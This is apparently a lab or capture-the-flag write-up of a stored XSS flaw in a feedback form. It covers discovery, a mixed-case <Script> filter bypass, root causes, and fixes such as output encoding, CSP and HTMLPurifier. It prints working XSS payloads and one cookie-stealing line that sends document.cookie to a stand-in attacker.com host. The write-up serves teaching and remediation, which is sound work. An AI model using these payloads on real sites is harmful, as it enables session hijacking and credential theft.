# Stored Cross-Site Scripting (XSS) Vulnerability

## How I Found It

### Step-by-Step Discovery Process

1. **Initial Reconnaissance**
   - Navigated to the feedback page at `http://192.168.1.16/?page=feedback`
   - Identified a form with two input fields: Name and Message
   - Observed the form accepts user input and displays it back on the page

2. **Frontend Analysis**
   - Inspected the page source code
   - Found client-side validation in JavaScript:
     - `maxlength="10"` on Name field
     - `maxlength="50"` on Message field
     - `validate_required()` function checks for empty fields
     - Form uses `onsubmit="return validate_form(this)"`

3. **Testing Basic XSS Payloads**
   - Attempted to submit `<script>alert('XSS')</script>` in the Name field
   - Observed that the application appears to sanitize `<script>` tags (converts to lowercase and strips them)

4. **Identifying the Bypass**
   - Noticed that case-sensitivity might be exploited
   - HTML parsers treat `<Script>`, `<SCRIPT>`, and `<script>` identically
   - The server-side filter only removes lowercase `<script>` tags

## How I Exploited It

### Method 1: Using Browser Developer Tools

1. **Open Browser Developer Tools**

2. **Modify HTML Directly**
   ```html
   <!-- Before: -->
   <input name="txtName" type="text" size="30" maxlength="10">
   
   <!-- After: Remove or increase maxlength -->
   <input name="txtName" type="text" size="30" maxlength="100">
   ```

3. **Submit Payload with Mixed Case**
   - Name field: `<Script>alert('XSS')</Script>`
   - Message field: Any valid message
   - Submit the form

## Why It Works

### Root Cause Analysis

1. **Insufficient Input Validation**
   - The application only filters lowercase `<script>` tags
   - The filter logic likely uses simple string matching: `str_replace('<script>', '', $input)`
   - Does not account for case variations

2. **Client-Side vs Server-Side Validation**
   - **Client-side validation** (JavaScript) can be bypassed:
     - Users can disable JavaScript
     - HTML can be modified in Developer Tools
     - HTTP requests can be intercepted and modified
   - **Server-side validation** is incomplete:
     - Only checks for lowercase tags
     - Doesn't use proper HTML sanitization libraries

3. **Stored XSS Nature**
   - The malicious payload is **stored in the database**
   - Every time a user visits the feedback page, the script executes
   - This is more dangerous than reflected XSS because:
     - It's persistent
     - Affects all users who view the page
     - No user interaction required beyond visiting the page

4. **HTML Parser Behavior**
   - HTML is case-insensitive for tag names
   - `<Script>`, `<SCRIPT>`, and `<script>` are all valid and executable
   - The browser normalizes these to `<script>` during parsing

### Attack Impact

**High Severity** - Attackers can:
- Steal session cookies: `<Script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</Script>`
- Modify page content to display fake login forms
- Execute actions on behalf of authenticated users
- Install keyloggers to capture credentials

## How to Fix It

### 1. **Implement Proper Output Encoding**

Always encode user input before displaying it in HTML:

```php
// PHP Example
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// This converts:
// < to &lt;
// > to &gt;
// " to &quot;
// ' to &#039;
```

### 2. **Use Content Security Policy (CSP)**

Add HTTP headers to prevent inline script execution:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

This prevents execution of inline scripts even if XSS payloads are injected.

### 3. **Implement Robust Input Validation**

```php
// Server-side validation (PHP example)
function sanitize_input($data) {
    // Remove all HTML tags
    $data = strip_tags($data);
    
    // Or use a whitelist approach with HTML Purifier
    require_once 'HTMLPurifier.auto.php';
    $config = HTMLPurifier_Config::createDefault();
    $purifier = new HTMLPurifier($config);
    $clean_data = $purifier->purify($data);
    
    return $clean_data;
}

// Apply to all user inputs
$name = sanitize_input($_POST['txtName']);
$message = sanitize_input($_POST['mtxtMessage']);
```

### 4. **Never Trust Client-Side Validation**

- Client-side validation is for **user experience only**
- **Always validate on the server side**
- Assume all client-side controls can be bypassed

## OWASP References

- **CWE-79**: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
- **OWASP XSS Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

## Conclusion

This Stored XSS vulnerability exists due to:
1. Inadequate input sanitization (case-sensitive filtering)
2. Over-reliance on client-side validation
3. Lack of output encoding
4. Absence of Content Security Policy

The fix requires a defense-in-depth approach: proper input validation, output encoding, CSP headers, and secure coding practices throughout the application.